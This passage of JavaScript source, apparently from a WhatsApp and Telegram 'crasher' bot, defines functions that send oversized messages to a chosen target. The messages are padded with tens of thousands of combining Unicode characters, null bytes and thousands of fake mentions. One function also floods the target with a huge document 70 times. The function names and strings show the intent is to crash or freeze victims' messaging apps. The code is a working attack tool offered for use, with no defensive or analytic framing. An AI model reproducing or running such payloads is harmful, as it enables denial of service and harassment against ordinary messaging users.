    { upload: sock.waUploadToServer }
  )

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: media.imageMessage,
            hasMediaAttachment: true,
          },
          body: {
            text: "GetsuzoCrasherYou🩸⃟༑ " + "ꦽ".repeat(50000),
          },
          footerText: "© 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 to #S#X#?",
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000".repeat(10000),
                  flow_message_version: "3",
                }),
              },
              {
                name: "payment_method",
                buttonParamsJson: JSON.stringify({
                  reference_id: null,
                  payment_method: "DEMO",
                  payment_timestamp: null,
                  share_payment_status: true,
                }),
              },
            ],
            messageParamsJson: "{}",
          },
          contextInfo: {
            remoteJid: target,
            participant: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/stxpos",
                  unconsentedUsersUrl: "https://t.me/stxpos",
                  consentedUsersUrl: "https://t.me/stxpos",
                  cardIndex: 1,
                },
                {
                  originalUrl: "https://t.me/stxpos",
                  unconsentedUsersUrl: "https://t.me/stxpos",
                  consentedUsersUrl: "https://t.me/stxpos",
                  cardIndex: 2,
                },
              ],
            },
          },
          quotedMessage: {
            interactiveMessage: {
              body: { text: "⌁⃰𝒆‌Getsuzo Execution" + "ꦽ".repeat(20000) },
              footerText: "🍻⃟༑",
            },
          },
        },
      },
    },
  }

  await sock.relayMessage(target, msg, {})
}

async function CallUi(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "〽️" + "ꦾ".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     "ꦾ".repeat(10000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     "ꦾ".repeat(10000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function bukTele(target) {
 await bot.telegram.sendMessage(target, "؛ًٍَُّْ𝅯𝅯۪᳕ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ؛ًٍَُّْ𝅯𝅯۪᳕ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳓ࣰًً᳕ܾࣶۡ᪳ࣧࣧ᪳‌ًًًࣶ֖᳕ࣼ᳚᪳‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳓ࣰًً᳕ܾࣶۡ᪳ࣧࣧ᪳‌ًًًࣶ֖᳕ࣼ᳚᪳‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳓ࣰًً᳕ܾࣶۡ᪳ࣧࣧ᪳‌ًًًࣶ֖ࣼ᳚᪳" + "〽️〽️〽️〽️〽️〽️࿐");
}

async function docCrashTele(target) {
  let virtext = "؛ًٍَُّْ𝅯𝅯۪᳕ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕ྃྂ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳕‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ؛ًٍَُّْ𝅯𝅯۪᳕ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳓ࣰًً᳕ܾࣶۡ᪳ࣧࣧ᪳‌ًًًࣶ֖᳕ࣼ᳚᪳‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳓ࣰًً᳕ܾࣶۡ᪳ࣧࣧ᪳‌ًًًࣶ֖᳕ࣼ᳚᪳‌ٍ٘‌ࣹ٘ۛ٘‌ࣹ‌ࣱ‌ࣰࣩۡ‌᳕‌ࣱࣱ᳕‌ࣹۛ‌ֻࣩ᳓ࣰًً᳕ܾࣶۡ᪳ࣧࣧ᪳‌ًًًࣶ֖ࣼ᳚᪳" + "🔥〽️࿐";
  const dokumen = "./𖥂=>.js";
  fs.writeFileSync(dokumen, ".࿐\n".repeat(90000));
  
  for(let i = 0; i < 70; i++) {
    await bot.telegram.sendDocument(target, { source: dokumen, fileName: "./𖥂=l=𝑫𝒆==>.js" },
    {
      caption: virtext,
      parse_mode: "Markdown", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "❌࿐", callback_data: `Maklu` }]
        ],
      },
    });
  }
  
  fs.unlinkSync(dokumen);
}

async function bukTele1(target) {
 await bot.telegram.sendMessage(target, "󠀳󠀳󠀳󠀵󠀵󠀵󠀵‪󠀳󠀳󠀳󠀵󠀵󠀵󠀵󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(90000) + "〽️࿐");
}

async function lovelyios(target) {
  await sock.sendMessage(
    target,
    {
      text: "Abang" + "OY" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contextInfo: {
        externalAdReply: {
          title: `Anjir`,
          body: `Haii`,
          previewType: "PHOTO",
          thumbnail: "",
          sourceUrl: `https://t.me/xatanicvxii`, //jangan ganti soalnya ini pengirimnya ,jika diganti maka error.
        },
      },
    },
  );
}

async function sios(sock, jid) {
const s = "��".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆ�?" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/Snitchezs",
      }
      let msg = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆ�?" + s,
            matchedText: "𝔖𝔫𝔦𝔱𝔥",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕾̷⃰𝖓𝒊𝖙̦͈͈͈͈̾𝖍͢ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆ�?" + "��".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function Vcsyok(target) {
    const el = "ꦽ".repeat(50000);
    let q;
    let Msg;
    for (let i = 0; i < 1000; i++) {
        q = {
            key: {
                remoteJid: "status@broadcast",
                fromMe: false,
                id: "MAIN-" + Math.floor(Math.random() * 999999999),
                participant: "0@s.whatsapp.net"
            },
            message: {
                conversation: "ꦽ".repeat(50000),
                extendedTextMessage: {
                    text: "ꦽ".repeat(50000),
                    contextInfo: {
                        mentionedJid: Array.from(
                            { length: 1900 },
                            () => "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                        ),
                        stanzaId: "id-" + Math.floor(Math.random() * 999999999),
                        participant: "0@s.whatsapp.net"
                    }
                }
            }
        };
    }
    for (let i = 0; i < 1000; i++) {
        Msg = {
            call: {
                callType: 2,
                callId: String(Date.now()),
                callStartTimestamp: Date.now(),
                contextInfo: {
                    forwardingScore: 999999,
                    isForwarded: true,
                    stanzaId: "ctx-" + Date.now(),
                    participant: "0@s.whatsapp.net",
                    remoteJid: target,
                    mentionedJid: [
                        target,
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () =>
                            "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                        )
                    ],
                    entryPointConversionSource: "global_search_new_chat",
                    entryPointConversionApp: "com.whatsapp",
                    entryPointConversionDelaySeconds: 1,
                    quotedMessage: {
                        conversation: el,
                        stickerMessage: {
                            url: "https://files.catbox.moe/0pl5dp.jpg",
                            mimetype: "image/webp",
                            fileLength: "9999999"
                        },
                        urlTrackingMap: {
                            urlTrackingMapElements: [
                                {
                                    originalUrl: "https://t.me/Charlzz88",
                                    unconsentedUsersUrl: "https://t.me/Charlzz88",
                                    consentedUsersUrl: "https://t.me/Charlzz88",
                                    cardIndex: 1
                                },
                                {
                                    originalUrl: "https://t.me/Charlzz88",
                                    unconsentedUsersUrl: "https://t.me/Charlzz88",
                                    consentedUsersUrl: "https://t.me/Charlzz88",
                                    cardIndex: 2
                                }
                            ]
                        }
                    }
                }
            }
        };
    }
    await sock.relayMessage(target, Msg, { quote: q });
}

async function PhenoxDelay(target, mention) {
  let msg = await generateWAMessageFromContent(sock, {
    buttonsMessage: {
      tesockt: "⭑̤⟅̊༑".repeat(5000),
      contentTesockt: "./Phenox#Team".repeat(777777),
      footerTesockt: "Renzz.null",
      buttons: [
        {
          buttonId: "null",
          buttonTesockt: {
            displayTesockt: " PhenoxScary?¿" + "⭑̤⟅̊༑".repeat(4500),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
